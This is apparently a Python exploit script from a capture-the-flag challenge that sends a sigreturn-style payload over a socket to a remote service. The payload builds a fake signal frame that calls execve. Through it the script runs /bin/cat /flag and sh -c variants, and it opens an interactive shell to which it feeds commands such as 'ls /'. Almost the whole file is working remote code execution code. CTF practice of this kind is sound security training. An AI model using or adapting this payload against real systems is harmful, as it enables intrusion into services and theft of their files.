#!/usr/bin/env python3
"""execve is allowed, so run something that prints the flag by itself.

probe_syscall_allow.py showed the ENOENT control (execve("/no/such/file")) coming
back through the restart bait while execve("/bin/sh") produced nothing at all - a
syscall that is killed also produces nothing, but a *successful* execve replaces the
image, so the bait never runs either.  Rather than argue about which it was, hand
execve an argv that prints and exits:

    /bin/cat /flag
    /bin/sh -c 'cat /flag*; ls /'
    /bin/busybox cat /flag

Payload layout, offsets from buf (0x48..0x56 is off limits: that is where the
0x401032 gadget drops the 15 fed bytes):

    0x00  argv            0x20 path        0x28 arg1
    0x08 ...               0x30 arg2
"""
import re
import socket
import struct
import time
import importlib.util

spec = importlib.util.spec_from_file_location("e", "exploit.py")
e = importlib.util.module_from_spec(spec)
spec.loader.exec_module(e)

RESTART = 0x401000


def body(buf, path, args):
    b = bytearray(b"\x00" * (e.FRAME_AT + e.FRAME_LEN))
    slots = [0x20, 0x28, 0x30, 0x38]
    strings = [path] + list(args)
    assert len(strings) <= len(slots), strings
    argv = []
    for s, off in zip(strings, slots):
        sb = s.encode() + b"\x00"
        assert off + len(sb) <= 0x48, (s, off)
        b[off:off + len(sb)] = sb
        argv.append(buf + off)
    argv.append(0)
    for i, v in enumerate(argv):
        struct.pack_into("<Q", b, 8 * i, v)
    assert 8 * len(argv) <= 0x20
    struct.pack_into("<Q", b, e.OFF_G1, e.G1)
    struct.pack_into("<Q", b, e.OFF_SC, e.SC)
    struct.pack_into("<Q", b, e.OFF_BAIT, RESTART)
    for off, val in ((e.F_RIP, e.SC), (e.F_RSP, buf + e.OFF_BAIT),
                     (e.F_RAX, 59), (e.F_RDI, buf + 0x20), (e.F_RSI, buf),
                     (e.F_RDX, 0), (e.F_EFLAGS, 0x246),
                     (e.F_SEL, 0x33 | (0x2B << 48))):
        struct.pack_into("<Q", b, e.FRAME_AT + off, val)
    return bytes(b)


def attempt(label, path, args, cmds=None):
    s = socket.create_connection((e.HOST, e.PORT), timeout=25)
    try:
        L = struct.unpack("<Q", e.recvn(s, 8))[0]
        buf = (L - 0x80) & 0xFFFFFFFFFFFFFFFF
        s.sendall(b"\x90" * 24 + body(buf, path, args))
        time.sleep(0.5)
        s.sendall(b"Z" * 15)
        time.sleep(0.8)
        out = e.drain(s, 3.0)
        note = ""
        if out == b"":
            note = "  (silent: exec killed, or a shell is waiting)"
        elif len(out) == 8:
            note = "  (8 bytes = execve returned, path or argv rejected)"
        if cmds and (not out or len(out) > 8):
            try:
                s.sendall("".join(c + "\n" for c in cmds).encode())
                time.sleep(1.0)
                out += e.drain(s, 4.0)
            except OSError as ex:
                note += "  [commands rejected: %r]" % ex
        print("%-34s n=%-3d %r%s" % (label, len(out), out[:220], note))
        for f in re.findall(rb"sun\{[^{}\r\n]{1,140}\}", out):
            print("      [FLAG]", f.decode())
        return out
    finally:
        s.close()
    time.sleep(0.5)


if __name__ == "__main__":
    attempt("/bin/cat /flag", "/bin/cat", ["/flag"])
    attempt("/bin/sh -c cat /flag*;ls /", "/bin/sh", ["-c", "cat /flag*;ls /"])
    attempt("busybox cat /flag", "/bin/busybox", ["cat", "/flag"])
    a = attempt("/bin/sh interactive", "/bin/sh", [],
                cmds=["echo HELLO_FROM_SH", "ls /", "cat /flag* /home/flag/* 2>/dev/null"])
